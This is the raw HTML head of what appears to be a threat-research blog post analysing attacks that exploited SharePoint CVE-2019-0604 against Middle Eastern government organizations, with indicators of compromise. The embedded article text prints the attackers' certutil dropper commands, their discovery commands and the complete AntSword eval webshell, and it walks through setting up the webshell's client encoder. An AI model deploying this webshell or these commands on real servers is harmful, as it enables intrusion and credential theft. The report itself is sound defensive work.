
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/actors-still-exploiting-sharepoint-vulnerability/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="Threat actors are found continuing to exploit SharePoint Vulnerability CVE-2019-0604 to attack Middle Eastern Governments"/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations" />
<meta property="og:description" content="Threat actors are found continuing to exploit SharePoint Vulnerability CVE-2019-0604 to attack Middle Eastern Governments" />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="China Chopper" />
<meta property="article:tag" content="CVE-2019-0604" />
<meta property="article:tag" content="Emissary Panda" />
<meta property="article:tag" content="Middle East" />
<meta property="article:tag" content="SharePoint" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2020-02-03T14:00:42+00:00" />
<meta property="article:modified_time" content="2020-03-19T18:55:54+00:00" />
<meta property="og:updated_time" content="2020-03-19T18:55:54+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/01/Vulnerability-r3d2-900x450-1.png" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/01/Vulnerability-r3d2-900x450-1.png" />
<meta property="og:image:width" content="900" />
<meta property="og:image:height" content="450" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Threat actors are found continuing to exploit SharePoint Vulnerability CVE-2019-0604 to attack Middle Eastern Governments" />
<meta name="twitter:title" content="Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/01/Vulnerability-r3d2-900x450-1.png" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations Comments Feed" href="https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/feed/" />
<meta property="og:likes" content="14"/>
<meta property="og:readtime" content="13"/>
<meta property="og:views" content="25,177"/>
<meta property="og:date_created" content="February 3, 2020 at 6:00 AM"/>
<meta property="og:post_length" content="3463"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit-42/"/>
<meta property="og:author" content="Robert Falcone"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/robertfalcone/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:post_image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/01/Vulnerability-r3d2-900x450-1-380x184.png"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations","name":"Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations","description":"Our largest victim notification we've ever done: Threat actors are still exploiting SharePoint vulnerability CVE-2019-0604 to attack Middle Eastern governments","url":"https:\/\/unit42.paloaltonetworks.com\/actors-still-exploiting-sharepoint-vulnerability\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/actors-still-exploiting-sharepoint-vulnerability\/","datePublished":"February 3, 2020","articleBody":"Executive Summary\r\nOn September 10, 2019, we observed unknown threat actors exploiting a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell freely available on Github, which is remarkably similar to the infamous China Chopper webshell.\r\n\r\nOn January 10, 2020, we used Shodan to search for Internet accessible servers running versions of SharePoint vulnerable to CVE-2019-0604. While admittedly the version numbers provided by SharePoint within HTTP responses do not always provide the precise SharePoint version number, we decided to use it to check if it was less than the version numbers of the patched SharePoint versions from the Microsoft advisory. We performed this comparison and found 28,881 servers that advertised a vulnerable version of SharePoint. We did not actively check each server to verify if they were indeed vulnerable, so it is possible that many of these public-facing SharePoint servers were not vulnerable or since patched. Regardless, the sheer number of servers and publicly available exploit code suggests that CVE-2019-0604 is still a major attack vector.\r\n\r\nUsing this collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using Impacket\u2019s atexec tool to use dumped credentials to run commands on other systems. On September 19, 2019, we observed the same exact Mimikatz variant uploaded to a webshell hosted at another government organization in a second country in the Middle East. The Mimikatz variant uploaded to these two organizations is unique, as it involves a seemingly custom loader application written in .NET. Therefore, we believe that the same threat group is behind both intrusions.\r\n\r\nBack in April 2019, we first observed the Emissary Panda threat group exploiting CVE-2019-0604 to install webshells on SharePoint servers at government organizations in two Middle Eastern countries. Fast forward five months to the current attacks and we see exploitation of the same vulnerability at government organizations in two different countries compared to the April attacks. We do not have any strong ties to connect the current attacks exploiting this vulnerability in SharePoint with the Emissary Panda attacks carried out in April. The overlaps between these two sets of attacks include exploitation of a common vulnerability, similar toolset and a shared government victimology, but no strong pivot points to connect these attack campaigns together.\r\n\r\nThe exploitation of this vulnerability is not unique to Emissary Panda, as multiple threat groups are using this vulnerability to exploit SharePoint servers to gain initial access to targeted networks. We would like to acknowledge the possibility of an overlap in the AntSword webshell, as we stated that Emissary Panda used China Chopper in the April attacks and AntSword and China Chopper webshells are incredibly similar. However, at this time we do not believe the April attacks used AntSword based on artifacts analyzed on the SharePoint server, specifically none of the IIS logs in the April attacks used the AntSword User-Agent in requests to the webshell that were observed in the current attacks.\r\n\r\nPalo Alto Networks customers are protected from the threat described in this blog through Threat Prevention signatures for the exploits and C2 traffic as well as through WildFire. More details on this protection is available in the conclusion of the report.\r\nExploiting CVE-2019-0604\r\nOn September 10, 2019, we observed an HTTP POST request to the following URL that we believe was the exploitation of CVE-2019-0604 in a publicly facing SharePoint server (T1190):\r\n\r\n\/_layouts\/15\/picker.aspx\r\n\r\nWe did not have access to the data sent within the HTTP POST request above, however, we observed the following command executed on the SharePoint server at the time of the inbound request:\r\n\r\nC:\\Windows\\System32\\cmd.exe \/c echo PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBEZWJ1Zz0idHJ1ZSIgVHJhY2U9ImZhbHNlIiAlPg[..snip..] &gt; c:\\programdata\\cmd.txt &amp; certutil -decode c:\\programdata\\cmd.txt C:\\Program Files\\Common Files\\microsoft shared\\Web Server Extensions\\14\\TEMPLATE\\LAYOUTS\\c.aspx &amp; certutil -decode c:\\programdata\\cmd.txt C:\\Program Files\\Common Files\\microsoft shared\\Web Server Extensions\\15\\TEMPLATE\\LAYOUTS\\c.aspx &amp; certutil -decode c:\\programdata\\cmd.txt C:\\Program Files\\Common Files\\microsoft shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\c.aspx\r\n\r\nThe command above uses the echo command to write a large chunk of base64 encoded data to a text file named cmd.txt. The command then uses the certutil application to convert the base64 encoded data (T1132) in the cmd.txt file to c.aspx in three different SharePoint related folders. The result of this entire command saves a variant of the Awen asp.net webshell (T1100) to the SharePoint server to further interact with the compromise server. The Awen webshell deployed in the exploitation of this SharePoint vulnerability had a SHA256 hash of 5d4628d4dd89f31236f8c56686925cbb1a9b4832f81c95a4300e64948afede21.\r\nActor\u2019s Awen Webshell\r\nJust 40 seconds after the suspected exploitation of CVE-2019-0604, we observed the first HTTP GET request to a webshell at c.aspx, which is a modified version of the freely available awen asp.net webshell. We believe this HTTP GET request was the actor visiting the webshell after exploitation and prior to executing commands. Figure 1 shows the Awen webshell, which has little functionality outside of setting the path to the command prompt application and running commands.\r\n\r\n[caption id=\"attachment_103709\" align=\"aligncenter\" width=\"1024\"] Figure 1 Awen webshell installed by actor after exploiting CVE-2019-0604[\/caption]\r\n\r\nThe actor uses the Awen webshell seen in Figure 1 to run various commands to do an initial discovery on the system and network, including user accounts (T1033 and T1087), files and folders (T1083), privileged groups (T1069), remote systems (T1018) and network configuration (T1016). Table 1 not only shows the commands used for discovery, but also the commands used to deploy another webshell to the server using the echo command to write base64 encoded data to a.txt and using the certutil application to decode and save to bitreeview.aspx. Table 1 also shows the time delta between the commands executed using the Awen webshell to provide insight into the tempo at which this actor executed commands.\r\n\r\n\r\n\r\nTime delta from previous command\r\nCommand\r\n\r\n\r\n3 minutes 55 seconds (from initial exploitation)\r\ndir c:\\programdata\\\r\n\r\n\r\n14 seconds\r\nquery user\r\n\r\n\r\n15 seconds\r\nnet group \/do\r\n\r\n\r\n32 seconds\r\nwhoami\r\n\r\n\r\n18 seconds\r\nnet user &lt;redacted hostname&gt; \/do\r\n\r\n\r\n12 seconds\r\nnet localgroup administrators\r\n\r\n\r\n21 seconds\r\nping -n 1 8.8.8.8\r\n\r\n\r\n20 seconds\r\nnet group exchange servers \/do\r\n\r\n\r\n22 seconds\r\nipconfig \/all\r\n\r\n\r\n23 seconds\r\nping -n 1 -a 10.x.x.x\r\n\r\n\r\n10 minutes 53 seconds\r\necho PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQi[..snip..] &gt; c:\\programdata\\a.txt\r\n\r\n\r\n5 seconds\r\ntype c:\\programdata\\a.txt\r\n\r\n\r\n5 seconds\r\ncertutil -decode c:\\programdata\\a.txt c:\\program files\\common files\\microsoft shared\\web server extensions\\14\\template\\layouts\\bitreeview.aspx\r\n\r\n\r\n23 seconds\r\ndel c:\\programdata\\a.txt\r\n\r\n\r\n\r\nTable 1 Awen webshell installed by actor after exploiting CVE-2019-0604\r\nThe webshell named bitreeview.aspx was saved to a folder within the SharePoint server\u2019s install path. The bitreeview.aspx file is a variant of the AntSword webshell that has undeniably similar traits as the infamous China Chopper webshell. After installing this AntSword webshell, the actor no longer uses the Awen webshell and issues the first command to AntSword 35 seconds after the last command issued to the Awen webshell.\r\nActor\u2019s AntSword Webshell\r\nAntSword is a modular webshell that involves a very simple webshell that the actor would deploy to the compromised server and a client application referred to as the AntSword Shell Manager. The use of the client application differs from many other webshells that the actor would interact with in a browser window. The actor would use the AntSword Shell Manager to interact with the AntSword webshell on the compromised server, as the Shell Manager sends the appropriate script to the webshell that will execute to carry out the desired action. To provide a sense of the limited functionality within the webshell itself, the bitreeview.aspx AntSword webshell deployed in this attack (SHA256: 15ecb6ac6c637b58b2114e6b21b5b18b0c9f5341ee74b428b70e17e64b7da55e) was only 162 bytes and contained the following:\r\n%@ Page Language=\"Jscript\"%\r\n\r\n% \r\neval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.\r\nFromBase64String(Request.Item[\"Darr1R1ng\"])),\"unsafe\"); %\r\nAs you can see from the code above, the AntSword webshell has no functionality other than running a script provided by the AntSword Shell Manager, specifically within a field named Darr1R1ng of an HTTP POST request. The code above also tells us the actors had created their own custom \u201cencoder\u201d within the AntSword Shell Manager to be able to interact with the code above, which we will discuss in detail in the next section.\r\n\r\nThe actors used the AntSword webshell to run a variety of commands on the compromised server. The following are a list of the initial commands issued using this webshell that will attempt to do initial system and user discovery, as well as attempt to ping systems of interest:\r\n\r\n \twhoami\r\n \tquery user\r\n \tnltest \/domain_Trusts\r\n \tping -n 1 &lt;redacted domain name&gt;\r\n \tipconfig \/all\r\n \tnet group \/do\r\n \tnet group Exchange Servers \/do\r\n \ting -n 1 &lt;redacted hostname of Exchange server&gt;\r\n \tping -n 1 &lt;redacted hostname of Exchange server&gt;\r\n \tquery user\r\n\r\nThe ping attempts suggests that this actor seeks to gain access to Microsoft Exchange servers, which may be part of their objective or they desire the elevated privileges on the domain that an Exchange server provides. Also, the ping attempts show the actor misspelled the command their first attempt, which suggests that these commands were issued with hands on-keyboard and not through an automated script. Figure 2 shows the terminal interface within the AntSword Shell Manager application through which the actors would have issued commands.\r\n\r\n[caption id=\"attachment_103661\" align=\"aligncenter\" width=\"1024\"] Figure 2 Terminal within AntSword\u2019s Shell Manager interacting with webshell[\/caption]\r\n\r\nWhile we did not have 100% visibility, we also believe the actors used the AntSword webshell to upload tools to the server as well, specifically cURL, a custom Mimikatz variant, and compiled variants of Impacket\u2019s wmiexec and atexec tools. AntSword has a FileManager interface that provides a navigation capability similar to Windows Explorer, which allows the actor to upload and download files to and from the compromised server. Figure 3 shows the FileManager interface within the AntSword Shell Manager application.\r\n\r\n[caption id=\"attachment_103663\" align=\"aligncenter\" width=\"1024\"] Figure 3 FileManager interface within AntSword\u2019s Shell Manager using the webshell[\/caption]\r\n\r\nThe actor issued commands to the webshell using these uploaded tools. For instance, the cURL tool was used in the command curl.exe ipinfo.io --max-time 5 to determine if the server had outbound access to the Internet and to obtain the external IP address of the compromised system. The actors used the \u2018net use\u2019 command, Mimikatz and the Impacket tools specifically for lateral movement. It appears the actors used Mimikatz to dump credentials from memory (T1003) and used the Impacket tools to use the pass the hash (T1075) technique to run commands on other systems.\r\nActor\u2019s Custom AntSword Encoder\r\nTo use the AntSword webshell installed on the SharePoint server, the actor had to create a custom encoding module in AntSword. We know this as the default encoders in the AntSword Shell Manager were unable to successfully interact with the bitreeview.aspx webshell. We found that the default base64 encoder would not base64 encode the data in the Darr1R1ng field, rather it would deliver it in cleartext, as seen in HTTP POST request seen in Figure 4. When we attempted to use the default base64 encoder to interact with the bitreeview.aspx webshell installed by the threat actor, the server responded with HTTP 500 error messages as the cleartext Darr1R1ng field contained characters that were not in the base64 alphabet.\r\n\r\n[caption id=\"attachment_103712\" align=\"aligncenter\" width=\"913\"] Figure 4 HTTP POST request issued by AntSword Shell Manager to webshell using default base64 encoder[\/caption]\r\n\r\nWe determined that the actor must have created a custom encoding module in the AntSword Shell Manager that base64 encoded the entire Darr1R1ng field to successfully interact with the bitreeview.aspx webshell. The AntSword Shell Manager includes an interface for a user to create a custom encoding module, so we set out to determine the steps the actor would take to be able to create this custom encoding to start interacting with the webshell.\r\n\r\n1. The actor would first start by opening the AntSword Shell Manager. Based on our analysis, they used AntSword v2.1 specifically. \u00a0 \u00a0 \u00a0 2. Before interacting with the installed webshell, the actor had to create a custom encoding module. To create the custom encoding module, the actor would click the AntSword &gt; Encoders manager from the menu.\r\n\r\n\r\n\r\n3. In the Encoder Manager interface, the actor would click the New Encoder button.\r\n\r\n\r\n\r\n4. From the New Encoder drop down, the actor would select ASPX as the AntSword webshell installed on the SharePoint server was an ASPX file.\r\n\r\n\r\n\r\n5. The actor would have to name the new encoder and click the blue button to continue. We chose the default name \u2018myencoder\u2019 for this example.\r\n\r\n\r\n\r\n6. After creating the new encoder, the actor would select the encoder and click the Edit menu button.\r\n\r\n\r\n\r\n7. After clicking the Edit button, the EditEncoder window opens and provides an example encoder that the actor can modify. To use the \u2018bitreeview.aspx\u2019 webshell on the server, the actor must have modified line 24 of the example encoder to base64 encode the contents \u2018Darr1R1ng\u2019 field instead of leaving them in cleartext.\r\n\r\n\r\n\r\n8. To base64 encode the \u2018Darr1R1ng\u2019 field, the actor would modify line 24 to code that has the same functionality as the code displayed in line 24 now. The actor would click the Save menu button to save the new custom encoding module.\r\n\r\n\r\n\r\n9. With the custom encoding module created, the actor would now add a new shell in the Shell Manager window by right clicking and selecting the Add button.\r\n\r\n\r\n\r\n10. The Add shell interface opens and allows the actor to configure the location of the shell, the name of the field within the HTTP POST request and the encoding module the webshell will use to interact with the Shell Manager.\r\n\r\n\r\n\r\n11. In this incident, the actor would have added the following settings and clicked the Add menu button:\r\n\r\n \t\r\n\r\n \tSet \u2018Shell url\u2019 to URL to the \u2018bitreeview.aspx\u2019 webshell (localhost in our testing)\r\n \tSet \u2018Shell pwd\u2019 to the word \u2018Darr1R1ng\u2019\r\n \tSet \u2018Shell type\u2019 to \u201cASPX\u201d from the drop down\r\n \tChecked the radio box next to \u2018myencoder\u2019 to select the custom encoder.\r\n\r\n\r\n\r\n\r\n\r\n12. After clicking the Add button, the shell is now listed within the Shell Managers interface.\r\n\r\n\r\n\r\n13. To interact with the webshell, the actor would right click the shell and choose actions from the displayed menu. To run commands on the webserver, the actor would select the Terminal menu button.\r\n\r\n\r\n\r\n14. The AntSword Shell Manager displays an interface that resembles a command prompt window. It also includes information about the system that the webshell is running on, such as the operating system, current user, current working directory and the storage volumes on the server.\r\n\r\n\r\n\r\n15. The actor would issue the desired commands in this window, which the webshell would run and respond with the results.\r\n\r\n\r\n\r\n16. If the actor wished to interact directly with the compromised server\u2019s file system, they could choose the FileManager menu button from the Shell Manager.\r\n\r\n\r\nAntSword Similarity to China Chopper\r\nAntSword and China Chopper are both modular webshells that actors would interact with using a client application instead of a web browser. It appears that developers of AntSword may have used China Chopper as a basis for their tool, as the default China Chopper webshell works with the default encoder of AntSword\u2019s ASPX webshell. The major differences between the two involves the code and parameters the two client applications send to the webshell to run commands and other activities. For instance, China Chopper uses two parameters named z1 and z2 when running commands via the webshell, as seen in Figure 5, whereas AntSword uses four randomly generated names each execution, as seen in Figure 6.\r\n\r\n[caption id=\"attachment_103714\" align=\"aligncenter\" width=\"912\"] Figure 5 HTTP POST request to China Chopper webshell to run a command with arrows pointing to its required parameters[\/caption]\r\n\r\n&nbsp;\r\n\r\n[caption id=\"attachment_103716\" align=\"aligncenter\" width=\"903\"] Figure 6 HTTP POST request to AntSword webshell to run a command with arrows pointing to its required parameters[\/caption]\r\n\r\nNot only do the parameters differ, but the code sent to the webshell differs as well. As you can see in Figure 7, the code used to run commands on the webshell by AntSword and China Chopper have several lines of code that are exactly the same, while some lines of code differ and several lines were added to AntSword\u2019s code on the right. The code on the right side of Figure 7 is AntSword, which includes additional lines of code to allow the actor to set environment variables before running the command.\r\n\r\n[caption id=\"attachment_103718\" align=\"aligncenter\" width=\"1024\"] Figure 7 Comparison between code used by AntSword and China Chopper to run a command on the webshell[\/caption]\r\n\r\n&nbsp;\r\nTools Seen in Related Webshell\r\nWhen analyzing tools uploaded to the AntSword webshell, we discovered the same Mimikatz sample uploaded to a webshell hosted on a server at another government organization in a different Middle Eastern country. On September 19, 2019, the actor uploaded this Mimikatz sample to the webshell hosted at a URL:\r\n\r\n&lt;redacted domain&gt;\/uploadedFiles\/green_post.aspx\r\n\r\nWe did not have access to the webshell hosted at this URL or visibility into the commands executed by the actor. We also do not know if the server is a SharePoint server or if a vulnerability was exploited to install the webshell. However, the Mimikatz sample was unique as it used a custom loader written in .NET, so we believe that the same threat group is involved in the intrusions at both of these government organizations.\r\n\r\nIn addition to the Mimikatz tool, the actor uploaded other tools to the webshell hosted at this second organization. Table 2 shows the executables uploaded to the webshell, which shows similar tools that actors uploaded to the AntSword webshell discussed earlier, including Mimikatz and Impacket\u2019s atexec tool.\r\n\r\n\r\n\r\nSHA256\r\nFilename\r\nDescription\r\n\r\n\r\nda53dcaeed..\r\nes.exe\r\nMimikatz with custom loader\r\n\r\n\r\n26d9212ec8..\r\nRar.exe\r\nLegitimate WinRAR\r\n\r\n\r\na4aca75bcc..\r\natec.exe\r\nCompiled Impacket atexec tool\r\n\r\n\r\ne4e05c9a21..\r\ndmp.exe\r\nDumpert tool\r\n\r\n\r\n\r\nTable 2 Tools uploaded to webshell hosted at second government organization\r\nOne of the tools seen in Table 2 that caught our interest was the Dumpert tool, which is freely available on Outflanknl\u2019s GitHub repository. The author of Dumpert describes the tool as an LSASS dumping tool that uses direct system calls and API unhooking to evade antivirus and EDR solutions. Dumpert is a relatively new tool with its initial commit to GitHub occurring on June 17, 2019. While the Dumpert tool is meant to help red teams emulate an adversary, we had not seen this tool used by threat actors until it was uploaded to this related webshell on September 23, 2019.\r\nConclusion\r\nThreat actors continue to exploit the CVE-2019-0604 vulnerability to compromise SharePoint servers, which is a vulnerability that Microsoft released a patch for in March 2019. We observed actors installing webshells to the SharePoint server that they use to run commands and upload additional tools to in order to dump credentials and move laterally to other systems on the network. We were also able to find a related webshell based on the threat group\u2019s tool reuse, specifically a custom Mimikatz sample. Thanks to this tool reuse, we found the threat group uploading a credential dumping tool called Dumpert that we had not seen used in prior incidents involving the exploitation of CVE-2019-0604.\r\n\r\nPalo Alto Networks customers are protected by:\r\n\r\n \tThe CVE-2019-0604 vulnerability is covered by our IPS signature Microsoft SharePoint Remote Code Execution Vulnerability (55411)\r\n \tThe AntSword ASPX Webshell is detected by our IPS signature AntSword Webshell Command and Control Traffic Detection (85561, 85562, 85563)\r\n \tThe Mimikatz, Impacket atexec and Dumpert tools are all marked with malicious verdicts by WildFire.\r\n\r\nIndicators of Compromise\r\nAwen Webshell\r\n5d4628d4dd89f31236f8c56686925cbb1a9b4832f81c95a4300e64948afede21\r\nAntSword Webshell\r\n15ecb6ac6c637b58b2114e6b21b5b18b0c9f5341ee74b428b70e17e64b7da55e\r\nMimikatz\r\nda53dcaeede03413ba02802c4be10883c4c28d3d28dee11734f048b90eb3d304\r\nRelated Tools\r\nda53dcaeede03413ba02802c4be10883c4c28d3d28dee11734f048b90eb3d304\r\n\r\n2836cf75fa0538b2452d77848f90b6ca48b7ff88e85d7b006924c3fc40526287\r\n\r\n26d9212ec8dbca45383eb95ec53c05357851bd7529fa0761d649f62e90c4e9fd\r\n\r\na4aca75bcc8f18b8a2316fd67a7e545c59b871d32de0b325f56d22584038fa10\r\n\r\ne4e05c9a216c2f2b3925293503b5d5a892c33db2f6ea58753f032b80608c3f2e","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2020\/01\/Vulnerability-r3d2-900x450-1-150x150.png","width":150,"height":150},"author":[{"@type":"Person","name":"Robert Falcone"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"103658","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=103658' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Factors-still-exploiting-sharepoint-vulnerability%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Factors-still-exploiting-sharepoint-vulnerability%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
